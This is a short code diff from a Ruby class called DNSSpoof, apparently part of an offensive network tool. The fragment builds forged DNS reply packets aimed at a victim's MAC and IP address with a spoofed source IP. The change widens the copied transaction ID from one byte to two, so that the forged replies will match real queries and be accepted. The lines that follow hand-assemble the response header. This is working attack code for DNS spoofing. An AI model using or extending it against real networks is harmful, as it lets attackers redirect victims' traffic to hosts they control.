@@ -158,7 +158,7 @@ class DNSSpoof < Spoof
         udp_packet.eth_daddr = @victim_mac
         udp_packet.ip_daddr = @victim_ip
         udp_packet.ip_saddr = @packet.ip_daddr
-        udp_packet.payload = @packet.payload[0, 1]
+        udp_packet.payload = @packet.payload[0, 2]
         
         udp_packet.payload += "\x81" + "\x80" + "\x00" + "\x01" + "\x00" + "\x01"
         udp_packet.payload += "\x00" + "\x00" + "\x00" + "\x00"
